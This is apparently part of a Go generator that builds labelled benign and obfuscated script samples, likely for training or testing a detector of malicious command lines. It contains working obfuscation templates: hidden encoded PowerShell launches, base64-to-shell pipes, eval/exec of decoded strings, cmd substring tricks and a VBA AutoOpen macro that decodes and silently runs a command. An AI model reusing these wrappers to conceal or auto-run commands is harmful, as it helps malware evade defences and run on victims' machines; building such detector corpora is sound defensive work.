		g.r.Shuffle(len(al), func(i, j int) { al[i], al[j] = al[j], al[i] })
		pos := map[rune]int{}
		for i, c := range al {
			pos[c] = i
		}
		name := g.randIdentLetters(2)
		out := g.mapWords(src, 0.6, func(w string) string {
			var sb strings.Builder
			for _, c := range w {
				if g.chance(0.6) {
					fmt.Fprintf(&sb, "%%%s:~%d,1%%", name, pos[c])
				} else {
					sb.WriteRune(c)
				}
			}
			return sb.String()
		})
		return "set " + name + "=" + string(al) + "&&" + out
	case "encoding":
		switch lang {
		case obfLangPS:
			if g.chance(0.5) {
				return g.pick("powershell -nop -w hidden -enc ", "powershell.exe -NoProfile -EncodedCommand ") + obfB64UTF16(src)
			}
			return "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + obfB64(src) + "')))"
		case obfLangCmd:
			return "cmd /c powershell -nop -w hidden -enc " + obfB64UTF16(src)
		case obfLangBash:
			return "echo " + obfB64(src) + " | base64 -d | sh"
		case obfLangJS:
			return "eval(atob('" + obfB64(src) + "'));"
		case obfLangPy:
			return "import base64\nexec(base64.b64decode('" + obfB64(src) + "'))"
		default:
			var hx strings.Builder
			for _, c := range []byte(src) {
				fmt.Fprintf(&hx, "%02X", c)
			}
			return "Sub AutoOpen()\n    Dim s As String, o As String, i As Long\n    s = \"" + hx.String() + "\"\n    For i = 1 To Len(s) Step 2\n        o = o & Chr(CLng(\"&H\" & Mid(s, i, 2)))\n    Next i\n    CreateObject(\"WScript.Shell\").Run o, 0\nEnd Sub"
		}
	case "rename":
		return g.renameVars(lang, src)
	}
	return src
}

func (g *obfGen) randIdentLetters(n int) string {
	const al = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = al[g.r.Intn(len(al))]
	}
	return string(b)
}

var (
	obfRenPS   = regexp.MustCompile(`\$([A-Za-z_][A-Za-z0-9_]{2,})`)
	obfRenJS   = regexp.MustCompile(`\b(?:var|let|const)\s+([A-Za-z_][A-Za-z0-9_]*)`)
	obfRenPy   = regexp.MustCompile(`(?m)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=[^=]|\bimport\s+([A-Za-z_][A-Za-z0-9_]*)|\bdef\s+([A-Za-z_][A-Za-z0-9_]*)|\bfor\s+([A-Za-z_]\w*)\s+in`)
	obfRenVBA  = regexp.MustCompile(`(?i)\bDim\s+([A-Za-z_][A-Za-z0-9_]*)|\bSet\s+([A-Za-z_][A-Za-z0-9_]*)\s*=`)
	obfRenBash = regexp.MustCompile(`\b([A-Z][A-Z0-9_]{2,})=`)
	obfRenCmd  = regexp.MustCompile(`(?i)\bset\s+([A-Za-z_][A-Za-z0-9_]{2,})=`)
)

var obfPSKeep = map[string]bool{"env": true, "true": true, "false": true, "null": true, "args": true, "input": true, "pshome": true, "host": true, "psitem": true, "lastexitcode": true, "error": true, "psscriptroot": true, "profile": true}

func (g *obfGen) renameVars(lang, src string) string {
	names := map[string]string{}
	add := func(n string) {
		if n == "" || names[n] != "" {
			return
		}
		if lang == obfLangPS && obfPSKeep[strings.ToLower(n)] {
			return
		}
		names[n] = g.randIdent()
	}
	switch lang {
	case obfLangPS:
		for _, m := range obfRenPS.FindAllStringSubmatch(src, -1) {
			add(m[1])
		}
	case obfLangJS:
		for _, m := range obfRenJS.FindAllStringSubmatch(src, -1) {
			add(m[1])
		}
	case obfLangPy:
		for _, m := range obfRenPy.FindAllStringSubmatch(src, -1) {
			for _, x := range m[1:] {
				add(x)
			}
		}
	case obfLangVBA:
		for _, m := range obfRenVBA.FindAllStringSubmatch(src, -1) {
			add(m[1])
			add(m[2])
		}
	case obfLangBash:
		for _, m := range obfRenBash.FindAllStringSubmatch(src, -1) {
			add(m[1])
		}
	case obfLangCmd:
		for _, m := range obfRenCmd.FindAllStringSubmatch(src, -1) {
			add(m[1])
		}
	}
	if len(names) == 0 {
		// no variables to rename: introduce one so the technique is observable
		v := g.randIdent()
		switch lang {
		case obfLangPS:
			return "$" + v + " = '" + g.word() + "'; " + src
		case obfLangJS:
			return "var " + v + " = '" + g.word() + "'; " + src
		case obfLangPy:
			return v + " = '" + g.word() + "'\n" + src
		case obfLangVBA:
			return "Dim " + v + " As String\n" + src
		case obfLangBash:
			return "X" + strings.ToUpper(v) + "=1; " + src
		default:
			return "set " + g.randIdentLetters(8) + "=1&& " + src
		}
	}
	var keys []string
	for k := range names {
		keys = append(keys, k)
	}
	sort.Slice(keys, func(i, j int) bool { return len(keys[i]) > len(keys[j]) })
	out := src
	for _, k := range keys {
		pat := `\b` + regexp.QuoteMeta(k) + `\b`
		if lang == obfLangCmd {
			out = regexp.MustCompile(`(?i)`+pat).ReplaceAllString(out, names[k])
			continue
		}
		out = regexp.MustCompile(pat).ReplaceAllString(out, names[k])
	}
	return out
}

// obfuscate applies 1..3 techniques valid for lang; encoding, when chosen, goes last.
func (g *obfGen) obfuscate(lang, src string, techs []string) (string, []string) {
	var order, tail []string
	for _, t := range techs {
		if t == "encoding" {
			tail = append(tail, t)
		} else {
			order = append(order, t)
		}
	}
	order = append(order, tail...)
	out := src
	for _, t := range order {
		out = g.applyTech(lang, t, out)
	}
	return out, techs
}

func (g *obfGen) chooseTechs(lang string) []string {
	pool := obfTechByLang[lang]
	k := 1
	switch x := g.r.Float64(); {
	case x < 0.4:
		k = 1
	case x < 0.8:
		k = 2
	default:
		k = 3
	}
	perm := g.r.Perm(len(pool))
	var out []string
	for i := 0; i < k && i < len(pool); i++ {
		out = append(out, pool[perm[i]])
	}
	sort.Strings(out)
	return out
}

// obfGenerate builds perLang benign and perLang obfuscated samples per language.
func obfGenerate(seed int64, perLang int) []obfSample {
	g := newObfGen(seed)
	var out []obfSample
	for _, lang := range obfLangs {
		for i := 0; i < perLang; i++ {
			var src string
			var one bool
			cat := "benign"
			if g.chance(0.3) {
				src, one = g.hardBenign(lang)
				cat = "hard-benign"
			} else {
				src, one = g.benignSource(lang)
			}
			kind := InspectKindScript
			if one || (!strings.Contains(src, "\n") && g.chance(0.7)) {
				kind = InspectKindCmdline
			}
			out = append(out, obfSample{Lang: lang, Kind: kind, Text: src, Cat: cat})
		}
		for i := 0; i < perLang; i++ {
			var src, cat string
			if g.chance(0.55) {
				src, cat = g.payloadSource(lang), "payload"
			} else {
				src, _ = g.benignSource(lang)
				if g.chance(0.5) && strings.Contains(src, "\n") {
					// obfuscate only part of a longer script, like real droppers
					lines := strings.Split(src, "\n")
					k := g.r.Intn(len(lines))
					src = lines[k]
				}
				cat = "benign-source"
			}
			techs := g.chooseTechs(lang)
			text, ts := g.obfuscate(lang, src, techs)
			kind := InspectKindScript
			if !strings.Contains(text, "\n") {
				kind = InspectKindCmdline
			}
			out = append(out, obfSample{Lang: lang, Kind: kind, Text: text, Obf: true, Techs: ts, Cat: cat})
		}
	}
	return out
}
